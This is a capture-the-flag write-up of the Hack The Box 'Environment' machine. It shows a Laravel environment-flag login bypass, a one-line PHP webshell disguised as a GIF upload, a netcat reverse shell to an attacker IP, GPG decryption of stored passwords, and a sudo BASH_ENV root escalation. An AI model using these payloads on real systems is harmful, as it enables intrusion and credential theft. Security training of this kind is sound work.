---
title: Environment [Medium]
date: 2025-08-20
tags: [htb, linux, nmap, feroxbuster, laravel, php, file upload, cve-2024-52301, cve-2024-21546, penelope, gpg, rce, systeminfo, environment variable, reverse shell]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/environment-htb-release-area-machine
image: /assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_banner.png
---

# Environment HTB Release Area Machine
## Machine information
Author: [coopertim13](https://app.hackthebox.com/users/55851)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.9.78
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 23:14 EDT
Nmap scan report for 10.129.9.78
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.95 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.9.78     environment.htb
```

Let's check the web server.

### Web Enumeration
Go to `http://environment.htb`.

![Environment Website](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_website.png)

So we enumerate around go nothing much, checking and the *View Page Source* and notice this part.

![Environment Website Source](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_website-source.png)

Found another endpoint `/mailing` so we checking it out.

![Environment Mailing](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_mailing.png)

We got error alert from laravel page with **Method Not Allowed**. The things we noticed is that it show the version of `PHP 8.2.28` and `Laravel 11.30.0`.
&rarr; To make sure we do not miss some endpoints, we gonna fuzzing with `feroxbuster`.

```bash
└─$ feroxbuster -u http://environment.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x .php,.html,.txt,.js,.json,.xml,.bak,.old -t 50 -e
                                                                                                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://environment.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, js, json, xml, bak, old]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       32l      137w     6603c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css
200      GET       54l      174w     2391c http://environment.htb/login
302      GET       12l       22w      358c http://environment.htb/logout => http://environment.htb/login
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
405      GET     2575l     8675w   244839c http://environment.htb/upload
200      GET       87l      392w     4602c http://environment.htb/index.php
200      GET       50l      135w     2126c http://environment.htb/up
301      GET        7l       11w      169c http://environment.htb/storage => http://environment.htb/storage/
301      GET        7l       11w      169c http://environment.htb/storage/files => http://environment.htb/storage/files/
301      GET        7l       11w      169c http://environment.htb/build => http://environment.htb/build/
301      GET        7l       11w      169c http://environment.htb/build/assets => http://environment.htb/build/assets/
301      GET        7l       11w      169c http://environment.htb/vendor => http://environment.htb/vendor/
200      GET        2l        3w       24c http://environment.htb/robots.txt
```

So there is a `/login` endpoint and `/upload` which we can assume that we can RCE server via file upload.

![Environment Login](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login.png)

Here is the thing, we do not have any credentials yet so there is no way we can login. <br>
&rarr; But let's enter some random credentials and check through burpsuite to see what happens.

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp.png)

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-2.png)

So we found out another POST request for `/login` endpoint. Let's recall back to the `/mailing` where we got error which we can use that to read some part of the source code. <br>
What we assume now is that what if we make this request throw error, will it show us part of the source code that may be leak credentials or even some information to bypass this login page.

```https
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 105
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://environment.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InhjQjhFbytjOWtYNSsyWlc1UmNBT0E9PSIsInZhbHVlIjoiOGJFUUhRWmdvNTQvc2VaMERmTjRYeS9uUEE3eTF1RVY4YUJsZ2YwVUswdVp1Z1ZZVDdqajlHYkVCSURROE0vbGsxQ1NoUFhHaGttSGp3WDVsakE2RjRtOXhnanV6QWVCTEtPbFA0QnBsMWdvYnl3RjRKV3VEVm9RRlRxaXN0ejEiLCJtYWMiOiI1NDlmZDI0NDI4MTZkMGM0MWFiNmIyNzYxODI3MjJkZjk5NWExZDAxZjE2NDFmM2FkMTlhYzI1OGE0NjM2YzcwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InBPdXF4WEF2S2dFU1E4THVUYlU0d3c9PSIsInZhbHVlIjoiM2c3L3AxcExwdzNpV3E5dDNZa2tyZGlvaHFjQWZGRUVYdGUrancwQ01NUm5yZHNWNUNhQmpqcVNOMkRjMmVHeWw3QlpDVkM3UkNDSFZ0cFlXRkROQ0pLZkpadkxFL2hQd2tLeTV2STZaREUvZEVlbHdTSmFHcjFHN1FMeHBmTWIiLCJtYWMiOiI4ZDAxMzViMjY5NTNjOGI1MDRjMzdkODEzYTViMmE3NTc3ZDY0MWZiNGNhY2UzOGYyZDJlZDViOWFkNzFiNGY1IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=dR2QrvVrIYiJZIYs559GefVrlVJVIXlqqzjjXz1O&email[]=test%40test.test&password[]=test&remember[]=False
```

We will put the `[]` in to those parameters to see if we got the error.

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-3.png)

Noice, we got `Internal Server Error` and we can see part of the code from `/routes/web.php` file.

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs

        $request->session()->regenerate();

        $request->session()->put('user_id', 1);

        return redirect('/management/dashboard');

    }
```

So we can see that we can bypass the login page by using `preprod` environment. <br>
&rarr; Here is the question, how to manipulate this part?

Back to the version of both `php` and `laravel`. Searching for vulnerability and found out [laravel-11-30-0-exploit](https://muneebdev.com/laravel-11-30-0-exploit/) and we saw this `Argument Injection Vulnerability (CVE-2024-52301)`.
&rarr; Searching out and got [GHSA-gv7v-rgg6-548h](https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h) about `Environment manipulation via query string` then found out this [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301) POC.

### CVE-2024-52301
Let's exploit this out.

First we gonna enter a random credentials in the `/login` page and then intercept that request with burpsuite.

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-4.png)

Then we modify the first line to `POST /login?--env=preprod` and click `Forward` button.

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-5.png)

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-6.png)

After that, we can see that the next request is `GET /management/dashboard` mean that we are successfully bypass the login page.

![Environment Login Burp](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_login-burp-7.png)

From the dashboard, we see list of mailing but seems nothing much. <br>
&rarr; Checking out the profile page.

![Environment Profile](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_profile.png)

There is email `hish@environment.htb` and also **Upload** button which we can choose new picture to update our profile. <br>
&rarr; Gonna update a example picture to see what happens.

![Environment Profile Upload](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_profile-upload.png)

So we thinking that there maybe a file to rce from this function. Searching and found out this [CVE-2024-21546](https://www.wiz.io/vulnerability-database/cve/cve-2024-21546) and also got this one from [ImHades101](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca) to see how we can exploit this.

### CVE-2024-21546
First we need to create a `naruto.php.` file.

```bash
└─$ cat naruto.php. 
GIF89a<?php system($_GET['c']); ?>
```

> *Remeber the `.` as it said from the gist. And the `GIF89a` to make the application think that it is a gif file.*

Now upload it.

![Environment Profile Upload](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_profile-upload-2.png)

![Environment Profile Upload](/assets/img/environment-htb-release-area-machine/environment-htb-release-area-machine_profile-upload-3.png)

There we go, we are rce as **www-data** user. <br>
Now we need to reverse shell for more information discovery.

```bash
└─$ penelope -p 3333                                                                                       
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Use this `nc 10.10.16.36 3333` to get the reverse shell.

> *Be sure to check if there is `nc` via `which nc` command.*

```bash
└─$ penelope -p 3333     
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.36
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from environment~10.129.9.78-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/environment~10.129.9.78-Linux-x86_64/2025_08_20-01_25_23-284.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@environment:~/app/storage/app/public/files$
```

Got our reverse shell.

```bash
www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Aug 20 15:26 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Aug 20 13:01 user.txt
www-data@environment:/home/hish$ cat user.txt
300f5c0f5b0488eea9f2c5029c674e9d
```

Grab the `user.txt` flag.

## Initial Access
After we intial in as **www-data** user, we recon around to see what we can do.

### GNU Privacy Guard
```bash
www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Aug 20 15:26 keyvault.gpg
```

```bash
www-data@environment:/home/hish/backup$ file keyvault.gpg 
keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .
```

We found out this file is a PGP encrypted session key and we need to decrypt it.

```bash
www-data@environment:/home/hish/.gnupg$ ls -la
total 32
drwxr-xr-x 4 hish hish 4096 Aug 20 15:27 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
drwxr-xr-x 2 hish hish 4096 Aug 20 15:27 openpgp-revocs.d
drwxr-xr-x 2 hish hish 4096 Aug 20 15:27 private-keys-v1.d
-rwxr-xr-x 1 hish hish 1446 Jan 12  2025 pubring.kbx
-rwxr-xr-x 1 hish hish   32 Jan 12  2025 pubring.kbx~
-rwxr-xr-x 1 hish hish  600 Jan 12  2025 random_seed
-rwxr-xr-x 1 hish hish 1280 Jan 12  2025 trustdb.gpg
```

Then we got these from `~/.gnupg` directory. <br>
&rarr; We searching and got [Encryption and Decryption with GPG](https://www.redhat.com/en/blog/encryption-decryption-gpg) to see how we can decrypt this file.

Now we will decrypt the `keyvault.gpg` file.

```bash
www-data@environment:/home/hish$ gpg --homedir /home/hish/.gnupg --output /tmp/keyvault.txt --decrypt /home/hish/backup/keyvault.gpg
gpg: WARNING: unsafe ownership on homedir '/home/hish/.gnupg'
gpg: failed to create temporary file '/home/hish/.gnupg/.#lk0x000055c5ce8a45f0.environment.2950': Permission denied
gpg: can't connect to the agent: Permission denied
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
gpg: decryption failed: No secret key
```

From here, we can see that **Permission denied** and if we check that we are **www-data** and not **hish** so we attempt to `cp` the `/.gnupg` directory to `/tmp`.

```bash
www-data@environment:/tmp$ cp -r /home/hish/.gnupg/ .
www-data@environment:/tmp$ ls -la
total 40
drwxrwxrwt 10 root     root     4096 Aug 20 15:40 .
drwxr-xr-x 18 root     root     4096 Apr 30 00:31 ..
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .ICE-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .X11-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .XIM-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .font-unix
drwxr-xr-x  4 www-data www-data 4096 Aug 20 15:40 .gnupg
drwx------  3 root     root     4096 Aug 20 13:01 systemd-private-06add1c7763d4c8988870fcb3cac3170-systemd-logind.service-wzq8Ff
drwx------  3 root     root     4096 Aug 20 13:00 systemd-private-06add1c7763d4c8988870fcb3cac3170-systemd-timesyncd.service-i3fHN6
drwx------  2 root     root     4096 Aug 20 13:01 vmware-root_564-2965382482
```

Now that folder is now belongs to **www-data** user. <br>
&rarr; Now we can decrypt the `keyvault.gpg` file.

```bash
www-data@environment:/tmp$ gpg --homedir /tmp/.gnupg --output /tmp/keyvault.txt --decrypt /home/hish/backup/keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
```

```bash
www-data@environment:/tmp$ ls -la
total 44
drwxrwxrwt 10 root     root     4096 Aug 20 15:41 .
drwxr-xr-x 18 root     root     4096 Apr 30 00:31 ..
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .ICE-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .X11-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .XIM-unix
drwxrwxrwt  2 root     root     4096 Aug 20 13:00 .font-unix
drwxr-xr-x  4 www-data www-data 4096 Aug 20 15:41 .gnupg
-rw-r--r--  1 www-data www-data  107 Aug 20 15:41 keyvault.txt
drwx------  3 root     root     4096 Aug 20 13:01 systemd-private-06add1c7763d4c8988870fcb3cac3170-systemd-logind.service-wzq8Ff
drwx------  3 root     root     4096 Aug 20 13:00 systemd-private-06add1c7763d4c8988870fcb3cac3170-systemd-timesyncd.service-i3fHN6
drwx------  2 root     root     4096 Aug 20 13:01 vmware-root_564-2965382482
www-data@environment:/tmp$ cat keyvault.txt 
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

Got another credentials that could probably for `hish` user. <br>
&rarr; `marineSPm@ster!!`.

```bash
└─$ ssh hish@10.129.9.78             
hish@10.129.9.78's password: 
hish@environment:~$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Aug 20 15:43 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
-rw-r--r-- 1 root hish   33 Aug 20 13:01 user.txt
```

Nailed it.

## Privilege Escalation
Let's take a look around `hish` user.

### Systeminfo
```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

```bash
hish@environment:~$ sudo /usr/bin/systeminfo
[sudo] password for hish: 

### Displaying kernel ring buffer logs (dmesg) ###
[    4.160174] auditfilter: audit rule for LSM 'crond_t' is invalid
[    4.160202] auditfilter: audit rule for LSM 'crond_t' is invalid
[ 1987.609779] perf: interrupt took too long (2543 > 2500), lowering kernel.perf_event_max_sample_rate to 78500
[ 2329.163825] perf: interrupt took too long (3190 > 3178), lowering kernel.perf_event_max_sample_rate to 62500
[ 2563.152308] perf: interrupt took too long (4012 > 3987), lowering kernel.perf_event_max_sample_rate to 49750
[ 3085.062800] perf: interrupt took too long (5018 > 5015), lowering kernel.perf_event_max_sample_rate to 39750
[ 3179.101101] INFO: NMI handler (nmi_cpu_backtrace_handler) took too long to run: 154.790 msecs
[ 3470.874093] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
[ 4261.792866] perf: interrupt took too long (6284 > 6272), lowering kernel.perf_event_max_sample_rate to 31750
[ 7133.007781] perf: interrupt took too long (7923 > 7855), lowering kernel.perf_event_max_sample_rate to 25000

### Checking system-wide open ports ###
State                        Recv-Q                       Send-Q                                               Local Address:Port                                               Peer Address:Port                       Process                                                                                             
LISTEN                       0                            511                                                        0.0.0.0:80                                                      0.0.0.0:*                           users:(("nginx",pid=957,fd=5),("nginx",pid=956,fd=5),("nginx",pid=954,fd=5))                       
LISTEN                       0                            128                                                        0.0.0.0:22                                                      0.0.0.0:*                           users:(("sshd",pid=955,fd=3))                                                                      
LISTEN                       0                            511                                                           [::]:80                                                         [::]:*                           users:(("nginx",pid=957,fd=6),("nginx",pid=956,fd=6),("nginx",pid=954,fd=6))                       
LISTEN                       0                            128                                                           [::]:22                                                         [::]:*                           users:(("sshd",pid=955,fd=4))                                                                      

### Displaying information about all mounted filesystems ###
sysfs        on  /sys                                                 type  sysfs        (rw,nosuid,nodev,noexec,relatime)
proc         on  /proc                                                type  proc         (rw,relatime,hidepid=invisible)
udev         on  /dev                                                 type  devtmpfs     (rw,nosuid,relatime,size=1980748k,nr_inodes=495187,mode=755,inode64)
devpts       on  /dev/pts                                             type  devpts       (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs        on  /run                                                 type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=400920k,mode=755,inode64)
/dev/sda1    on  /                                                    type  ext4         (rw,relatime,errors=remount-ro)
securityfs   on  /sys/kernel/security                                 type  securityfs   (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /dev/shm                                             type  tmpfs        (rw,nosuid,nodev,inode64)
tmpfs        on  /run/lock                                            type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
cgroup2      on  /sys/fs/cgroup                                       type  cgroup2      (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
pstore       on  /sys/fs/pstore                                       type  pstore       (rw,nosuid,nodev,noexec,relatime)
bpf          on  /sys/fs/bpf                                          type  bpf          (rw,nosuid,nodev,noexec,relatime,mode=700)
systemd-1    on  /proc/sys/fs/binfmt_misc                             type  autofs       (rw,relatime,fd=30,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13921)
hugetlbfs    on  /dev/hugepages                                       type  hugetlbfs    (rw,relatime,pagesize=2M)
mqueue       on  /dev/mqueue                                          type  mqueue       (rw,nosuid,nodev,noexec,relatime)
tracefs      on  /sys/kernel/tracing                                  type  tracefs      (rw,nosuid,nodev,noexec,relatime)
debugfs      on  /sys/kernel/debug                                    type  debugfs      (rw,nosuid,nodev,noexec,relatime)
configfs     on  /sys/kernel/config                                   type  configfs     (rw,nosuid,nodev,noexec,relatime)
fusectl      on  /sys/fs/fuse/connections                             type  fusectl      (rw,nosuid,nodev,noexec,relatime)
ramfs        on  /run/credentials/systemd-sysctl.service              type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-sysusers.service            type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup-dev.service  type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup.service      type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
binfmt_misc  on  /proc/sys/fs/binfmt_misc                             type  binfmt_misc  (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /run/user/1000                                       type  tmpfs        (rw,nosuid,nodev,relatime,size=400916k,nr_inodes=100229,mode=700,uid=1000,gid=1000,inode64)

### Checking system resource limits ###
real-time non-blocking time  (microseconds, -R) unlimited
core file size              (blocks, -c) 0
data seg size               (kbytes, -d) unlimited
scheduling priority                 (-e) 0
file size                   (blocks, -f) unlimited
pending signals                     (-i) 15474
max locked memory           (kbytes, -l) 501144
max memory size             (kbytes, -m) unlimited
open files                          (-n) 1024
pipe size                (512 bytes, -p) 8
POSIX message queues         (bytes, -q) 819200
real-time priority                  (-r) 0
stack size                  (kbytes, -s) 8192
cpu time                   (seconds, -t) unlimited
max user processes                  (-u) 15474
virtual memory              (kbytes, -v) unlimited
file locks                          (-x) unlimited

### Displaying loaded kernel modules ###
Module                  Size  Used by
tcp_diag               16384  0
inet_diag              24576  1 tcp_diag
binfmt_misc            28672  1
vsock_loopback         16384  0
vmw_vsock_virtio_transport_common    53248  1 vsock_loopback
vmw_vsock_vmci_transport    36864  1
vsock                  53248  5 vmw_vsock_virtio_transport_common,vsock_loopback,vmw_vsock_vmci_transport
intel_rapl_msr         20480  0
intel_rapl_common      32768  1 intel_rapl_msr

### Checking disk usage for all filesystems ###
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           392M  688K  391M   1% /run
/dev/sda1       3.8G  1.7G  1.9G  48% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           392M     0  392M   0% /run/user/1000
```

From the output, we can see that it is checking the system information. <br>
But what we curious is `env_keep+="ENV BASH_ENV"`. <br>

So what if we can hijack this `ENV` or `BASH_ENV` to get the root access? <br>
&rarr; Gonna go for it.

### Hijacking environment variable
First we need to create a `root_shell` file contain `/bin/bash` command.

```bash
hish@environment:~$ echo '/bin/bash' > /tmp/root_shell
```

Then we set the `BASH_ENV` to `/tmp/root_shell` and run the `systeminfo` command.

```bash
hish@environment:~$ sudo BASH_ENV=/tmp/root_shell /usr/bin/systeminfo
root@environment:/home/hish#
```

BOOM! We are root now.

```bash
root@environment:~# ls -la
total 44
drwx------  6 root root 4096 Aug 20 13:01 .
drwxr-xr-x 18 root root 4096 Apr 30 00:31 ..
lrwxrwxrwx  1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 11  2021 .bashrc
drwx------  3 root root 4096 Jan 12  2025 .config
-rw-------  1 root root   20 Apr  7 20:34 .lesshst
drwxr-xr-x  3 root root 4096 Jan  8  2025 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Aug 20 13:01 root.txt
drwxr-xr-x  2 root root 4096 Apr 11 00:55 scripts
-rw-r--r--  1 root root   66 Jan 12  2025 .selected_editor
drwx------  2 root root 4096 Jan  6  2025 .ssh
root@environment:~# cat root.txt
f2dc782612101bdcf36c18e406d63d75
```

Pick the `root.txt` flag.

![result](/assets/img/environment-htb-release-area-machine/result.png)